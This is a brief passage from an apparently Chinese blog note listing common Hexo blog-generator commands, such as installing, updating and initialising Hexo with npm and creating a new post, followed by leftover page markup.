+                            hexo常用命令笔记hexonpm install hexo -g #安装npm update hexo -g #升级hexo init #初始化
+简写hexo n “我的博客” == hexo new “我的博客” #新建文章hexo p
                         
                     </div>
                     <div class="publish-info">
